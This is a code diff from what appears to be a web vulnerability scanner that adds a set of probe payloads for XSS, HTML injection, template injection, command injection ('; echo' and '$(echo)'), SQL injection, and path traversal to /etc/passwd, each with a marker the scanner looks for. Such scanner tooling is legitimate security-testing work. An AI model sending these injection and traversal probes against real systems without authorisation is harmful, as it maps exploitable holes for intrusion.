@@ -49,6 +49,40 @@ export interface SweepHit {
  * requests the benign baseline for that (endpoint,param). Injected by the caller. */
 export type SendProbe = (target: SweepTarget, param: string, value: string | null) => Promise<FuzzResponse>;
 
+/**
+ * The sweep's OWN payload set (distinct from payload-library's LLM-facing arsenal): each
+ * carries the exact `marker`/`computedMarker` the fuzz oracle needs. Computed values are
+ * deliberately DISTINCTIVE (1337*1337=1787569, a nonce'd echo) so a chance occurrence of
+ * "49" can't false-positive. XXE is not here — it replaces the whole body and is probed
+ * separately by the caller. Cheapest-first within each class.
+ */
+export const SWEEP_PAYLOADS: Record<string, SweepPayload[]> = {
+  xss_reflected: [
+    { payloadClass: "xss_reflected", payload: "<script>sahwSX1</script>", marker: "sahwSX1", note: "unencoded <script> reflected (body_contains vs a benign-text control)" },
+    { payloadClass: "xss_reflected", payload: "\"'><svg/onload=alert(1)>sahwSX2", marker: "sahwSX2", note: "attribute/tag breakout reflected unencoded" },
+  ],
+  html_injection: [
+    { payloadClass: "html_injection", payload: "<u>sahwHI1</u>", marker: "sahwHI1", note: "unescaped HTML tag reflected verbatim" },
+  ],
+  ssti: [
+    { payloadClass: "ssti", payload: "{{1337*1337}}", computedMarker: "1787569", note: "template evaluated the expression (computed 1787569, not the literal)" },
+    { payloadClass: "ssti", payload: "${{1337*1337}}", computedMarker: "1787569", note: "alt SSTI wrapper -> computed 1787569" },
+    { payloadClass: "ssti", payload: "<%= 1337*1337 %>", computedMarker: "1787569", note: "ERB/EJS evaluation -> computed 1787569" },
+  ],
+  command_injection: [
+    { payloadClass: "command_injection", payload: "; echo sahwCMD1787", computedMarker: "sahwCMD1787", note: "OS command executed (marker echoed)" },
+    { payloadClass: "command_injection", payload: "$(echo sahwCMD1787)", computedMarker: "sahwCMD1787", note: "command substitution -> marker in output" },
+  ],
+  sqli: [
+    { payloadClass: "sqli", payload: "'", note: "single quote -> DB error signature = injectable (error-based)" },
+    { payloadClass: "sqli", payload: "1'||'", note: "string-concat break -> DB error" },
+  ],
+  path_traversal: [
+    { payloadClass: "path_traversal", payload: "../../../../../../etc/passwd", marker: "root:x:0:0", note: "traversed /etc/passwd content returned" },
+    { payloadClass: "path_traversal", payload: "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd", marker: "root:x:0:0", note: "url-encoded traversal bypass" },
+  ],
+};
+
 /** How many payload classes and how many payloads-per-class the sweep enumerates. Kept
  * small (cheapest-first) so the request budget covers real breadth across many inputs. */
 export const DEFAULT_CLASS_ORDER = [
